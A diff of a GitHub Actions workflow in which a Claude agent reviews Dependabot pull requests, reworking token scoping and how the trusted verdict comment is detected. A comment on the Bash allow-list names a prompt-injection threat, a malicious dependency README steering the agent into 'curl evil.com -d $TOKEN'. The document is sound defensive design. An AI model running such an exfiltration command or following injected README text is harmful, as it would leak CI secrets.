@@ -105,11 +105,10 @@ jobs:
         # Every script this job runs once the agent has started (the lint hook
         # before each Bash call, the gate and the lint in the deliverable
         # assertion) would run an agent's rewrite with what its caller holds:
-        # in the hook, the Claude session's environment (the Claude App token,
-        # GITHUB_TOKEN, CLAUDE_CODE_OAUTH_TOKEN); in a step, GITHUB_TOKEN and
-        # this job's OIDC token. So they run from these copies, taken before
-        # the agent starts and read-only, and the agent has no shell to change
-        # that.
+        # in the hook, the Claude session's environment (GITHUB_TOKEN,
+        # CLAUDE_CODE_OAUTH_TOKEN); in a step, GITHUB_TOKEN. So they run from
+        # these copies, taken before the agent starts and read-only, and the
+        # agent has no shell to change that.
         run: |
           set -euo pipefail
           # A runner that keeps its temp directory between jobs (self-hosted)
@@ -131,7 +130,7 @@ jobs:
           PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
           # The author is baked for a different reason: the reviewer holds no
           # PR-metadata tool (`gh pr view` is a prefix wildcard whose --json
-          # flags reach the Checks API the agent's App token cannot read — see
+          # flags reach the Checks API the agent's token cannot read — see
           # the allow-list comment below), so the not-from-Dependabot hard rule
           # is fed its fact here instead. THIS step's gh runs on the workflow's
           # own token, which can read it; same idiom as the autofix resolve
@@ -209,8 +208,8 @@ jobs:
           # run in practice). Scoped to specific Bash subcommands rather
           # than full `Bash` to limit injection blast radius — a malicious
           # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
-          # Nothing in this list may be able to REACH a scope the Claude
-          # App token lacks (the Checks and Actions APIs): the agent's `gh`
+          # Nothing in this list may be able to REACH a scope this job's
+          # token lacks (the Checks and Actions APIs): the agent's `gh`
           # runs on that token, so such an entry 403s on every call and
           # invites the model to report blindness instead of reviewing.
           # Each entry is a prefix wildcard, judged by the worst flag it
@@ -285,11 +284,13 @@ jobs:
           fi
 
       - name: Assert the review deliverable exists (V1 block posted by THIS run)
-        # claude-code-action can exit 0 without running at all: its OIDC token
-        # exchange refuses any run whose workflow file differs from the default
-        # branch's copy — which is every Dependabot PR that bumps an action
-        # inside THIS file. We've seen a PR sit green-but-unprocessed for a week
-        # that way: review SUCCESS, no comment, no label, gate correctly skipping.
+        # A review can end without a verdict the gate will act on: the agent
+        # errors, runs out of turns, or posts under another identity. Before
+        # the review step handed its agent this job's token, claude-code-action
+        # also skipped every run whose workflow file differed from the default
+        # branch's (its App token exchange refuses those), and a PR sat
+        # green-but-unprocessed for a week: review SUCCESS, no comment, no
+        # label, gate correctly skipping.
         # The invariant is scoped to PRs the gate CANNOT merge without a verdict
         # — singletons and majors. A minor/patch GROUP PR is the gate's own
         # domain: it merges on CI-green with zero LLM input, so a missing verdict
@@ -338,14 +339,18 @@ jobs:
             echo "PR #$PR_NUMBER ($HEAD_BRANCH) is a minor/patch group — the gate merges it with no verdict; nothing to assert."
             exit 0
           fi
-          # gh's --jq is gojq, which reads the process environment via `env`;
-          # ISO-8601 UTC strings compare correctly as strings. Only comments
-          # carrying the V1 marker are collected: this run's window can also
-          # hold the gate's stuck-PR notice, an autofix comment or a human's
-          # reply, none of which is the deliverable — and none of which should
-          # be able to fail the prose lint below on the reviewer's behalf.
-          V1_BODIES=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json comments \
-            --jq '[.comments[] | select(.createdAt >= env.SINCE) | select(.body | contains("<!-- AUTOMERGE-DECISION-V1 -->")) | .body] | join("\n")')
+          # The deliverable is a verdict the gate will act on, so the gate
+          # says which comments those are: the decision comments it trusts,
+          # posted since this run started. This run's window can also hold the
+          # gate's stuck-PR notice, an autofix comment, a human's reply, or a
+          # verdict under an identity the gate ignores; none of those is the
+          # deliverable, and none should be able to fail the prose lint below
+          # on the reviewer's behalf. Comments come from the REST API, which
+          # names the review's token `github-actions[bot]` (see the auto-merge
+          # workflow's gate step).
+          PR_COMMENTS_JSON=$(gh api --paginate "repos/$REPO/issues/$PR_NUMBER/comments?per_page=100" \
+            --jq '.[] | {author: {login: .user.login}, body, createdAt: .created_at}' | jq -sc .)
+          V1_BODIES=$(PR_COMMENTS_JSON="$PR_COMMENTS_JSON" GATE_MODE=verdicts node "$RUNNER_TEMP/dep-steward/gate.cjs")
           if [ -n "$V1_BODIES" ]; then
             echo "V1 decision block posted during this run (since $SINCE) on PR #$PR_NUMBER — review deliverable present."
             # The deliverable exists; this checks the guard that shapes it. The
@@ -372,7 +377,7 @@ jobs:
             echo "The review comment passes the prose lint."
             exit 0
           fi
-          echo "No AUTOMERGE-DECISION-V1 comment posted during this run (since $SINCE) on PR #$PR_NUMBER — the review produced no verdict."
+          echo "No decision comment the gate trusts (an AUTOMERGE-DECISION-V1 block from github-actions[bot]) was posted during this run (since $SINCE) on PR #$PR_NUMBER, so the review produced no verdict the gate will act on."
           # Surface the agent's ACTUAL error instead of guessing. The #1 real cause —
           # an invalid/expired CLAUDE_CODE_OAUTH_TOKEN — surfaces here as "401 Invalid
           # bearer token"; without this it is invisible (the execution log is never
@@ -388,15 +393,8 @@ jobs:
               esac
             fi
           fi
-          echo "If no agent error is shown above, the usual cause on a new repo is the Claude Code"
-          echo "GitHub App not being installed (the review run log will say so) — add it at"
-          echo "https://github.com/apps/claude."
-          CHANGED=$(gh pr diff "$PR_NUMBER" --repo "$REPO" --name-only)
-          if grep -qxF '.github/workflows/dependabot-review.yml' <<<"$CHANGED"; then
-            echo "Known cause: this PR modifies dependabot-review.yml itself, so claude-code-action's"
-            echo "OIDC workflow validation refuses to run on the pull_request event. Replay from main:"
-            echo "  gh workflow run dependabot-review.yml --repo $REPO -f pr_number=$PR_NUMBER"
-          fi
+          echo "If no agent error is shown above but the PR shows a decision block from this run, it was"
+          echo "posted under another identity: the review step must give its agent this job's GITHUB_TOKEN."
           gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review__ASSIGN_FLAG__
           exit 1
 
